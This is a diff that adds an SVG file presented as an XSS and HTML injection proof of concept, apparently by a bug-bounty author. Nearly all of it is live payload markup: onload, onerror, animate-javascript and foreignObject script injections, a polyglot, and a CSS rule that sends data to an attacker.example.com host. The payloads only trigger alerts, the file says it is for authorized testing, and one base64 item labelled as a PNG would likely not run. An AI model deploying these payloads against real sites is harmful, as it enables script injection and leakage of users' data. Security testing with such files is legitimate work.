@@ -1,0 +1,127 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<svg xmlns="http://www.w3.org/2000/svg" width="800" height="2000">
+  <foreignObject width="100%" height="100%">
+    <div xmlns="http://www.w3.org/1999/xhtml" style="font-family: Arial, sans-serif; padding: 20px;">
+      <h1>XSS/HTML Injection PoC - By H1Xploit</h1>
+      <hr/>
+
+      <!-- ==================== -->
+      <!-- Basic SVG XSS Payloads -->
+      <!-- ==================== -->
+      <div style="border: 2px solid red; padding: 15px; margin: 10px 0;">
+        <h2>1. Basic SVG XSS Payloads</h2>
+        
+        <!-- Payload 1: onload Execution -->
+        <div style="background: #f0f0f0; padding: 10px; margin: 10px 0;">
+          <h3>Payload: onload Alert</h3>
+          <svg xmlns="http://www.w3.org/2000/svg" onload="alert('Basic onload XSS')" width="100" height="20"/>
+          <p>Description: Executes JavaScript when SVG loads</p>
+        </div>
+
+        <!-- Payload 2: Animate XSS -->
+        <div style="background: #f0f0f0; padding: 10px; margin: 10px 0;">
+          <h3>Payload: Animate XSS</h3>
+          <svg xmlns="http://www.w3.org/2000/svg">
+            <animate attributeName="href" values="javascript:alert('Animate XSS')" begin="0s"/>
+          </svg>
+          <p>Description: Uses SVG animation to trigger JS</p>
+        </div>
+      </div>
+
+      <!-- ======================== -->
+      <!-- HTML Injection Test Area -->
+      <!-- ======================== -->
+      <div style="border: 2px solid blue; padding: 15px; margin: 10px 0;">
+        <h2>2. HTML Injection Tests</h2>
+        
+        <!-- HTML Elements -->
+        <div style="background: #f0f0f0; padding: 10px; margin: 10px 0;">
+          <h3>HTML Elements Injection</h3>
+          <h4 style="color: green">H4 Injected Element</h4>
+          <p>This is an injected paragraph</p>
+          <a href="#test" onclick="alert('Link Clicked')">Clickable Link</a><br/>
+          <button onclick="alert('Button Clicked')">Interactive Button</button>
+        </div>
+
+        <!-- Iframe Test -->
+        <div style="background: #f0f0f0; padding: 10px; margin: 10px 0;">
+          <h3>Iframe Injection</h3>
+          <iframe src="https://example.com" width="100%" height="150" style="border: 1px solid #ccc;"></iframe>
+        </div>
+      </div>
+
+      <!-- ====================== -->
+      <!-- Advanced XSS Payloads -->
+      <!-- ====================== -->
+      <div style="border: 2px solid green; padding: 15px; margin: 10px 0;">
+        <h2>3. Advanced XSS Payloads</h2>
+
+        <!-- Payload 3: ForeignObject JS -->
+        <div style="background: #f0f0f0; padding: 10px; margin: 10px 0;">
+          <h3>Payload: ForeignObject JS</h3>
+          <svg xmlns="http://www.w3.org/2000/svg">
+            <foreignObject width="100%" height="50">
+              <div xmlns="http://www.w3.org/1999/xhtml">
+                <script>alert('ForeignObject JS')</script>
+              </div>
+            </foreignObject>
+          </svg>
+          <p>Description: JavaScript in foreignObject container</p>
+        </div>
+
+        <!-- Payload 4: Base64 Encoded -->
+        <div style="background: #f0f0f0; padding: 10px; margin: 10px 0;">
+          <h3>Payload: Base64 Encoded</h3>
+          <image href="data:image/png;base64,PHNjcmlwdD5hbGVydCgnQmFzZTY0IEVuY29kZWQnKTwvc2NyaXB0Pg=="/>
+          <p>Description: Base64 encoded script payload</p>
+        </div>
+
+        <!-- Payload 5: Error-Based -->
+        <div style="background: #f0f0f0; padding: 10px; margin: 10px 0;">
+          <h3>Payload: Error-Based</h3>
+          <image href="invalid" onerror="alert('Error-Based XSS')"/>
+          <p>Description: Triggers onerror handler</p>
+        </div>
+      </div>
+
+      <!-- ============== -->
+      <!-- CSS Exfiltration -->
+      <!-- ============== -->
+      <div style="border: 2px solid purple; padding: 15px; margin: 10px 0;">
+        <h2>4. CSS Exfiltration Test</h2>
+        <style>
+          .leak { 
+            background: url("https://attacker.example.com/?leak=DATA");
+          }
+        </style>
+        <div class="leak" style="padding: 10px;">
+          CSS-based data exfiltration test
+        </div>
+        <p>Note: Check server logs for potential data leaks</p>
+      </div>
+
+      <!-- ============ -->
+      <!-- Polyglot Test -->
+      <!-- ============ -->
+      <div style="border: 2px solid orange; padding: 15px; margin: 10px 0;">
+        <h2>5. Polyglot SVG/HTML</h2>
+        <svg xmlns="http://www.w3.org/2000/svg">
+          <foreignObject width="100%" height="50">
+            <!-- Valid in both SVG and HTML -->
+            <script xmlns="http://www.w3.org/1999/xhtml">alert('Polyglot Payload')</script>
+          </foreignObject>
+        </svg>
+      </div>
+
+      <!-- Security Warning -->
+      <div style="background: #fff3cd; padding: 15px; margin: 20px 0; border: 1px solid #ffeeba;">
+        <h3>⚠️ Security Notes:</h3>
+        <ul>
+          <li>Actual execution depends on CSP and context</li>
+          <li>Some payloads may be blocked by modern browsers</li>
+          <li>Use only in authorized environments</li>
+        </ul>
+      </div>
+    </div>
+  </foreignObject>
+</svg>
